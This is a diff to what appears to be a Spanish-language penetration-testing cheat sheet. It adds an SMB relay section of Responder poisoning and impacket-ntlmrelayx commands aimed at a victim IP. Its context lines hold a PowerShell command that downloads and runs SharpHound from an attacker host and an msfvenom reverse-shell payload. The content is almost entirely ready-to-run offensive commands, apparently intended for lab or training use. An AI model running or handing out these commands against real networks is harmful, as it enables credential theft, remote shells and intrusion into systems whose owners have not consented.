@@ -145,3 +145,16 @@ IEX(New-Object Net.WebClient).downloadstring('http://10.10.14.64/SharpHound.ps1'
 ```python
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=53 -f exe -o reverse.exe
 ```
+
+### SMBRelay
+
+```python
+#Comprobando firmas SMB
+crackmapexec smb 10.0.2.6
+nmap -p 445 --script smb2-security-mode <IP> -Pn
+#Ataque con Responder
+#Editar el archivo de configuración de Responder y desactivar las opciones SMB y HTTP -> /etc/responder/Responder.conf
+sudo responder -I eth0 -dw
+impacket-ntlmrelayx -t <IP_VÍCTIMA> -smb2support
+#(Actualizar este punto porque parece que los comandos y la ejecución está bastante deprecada)
+```
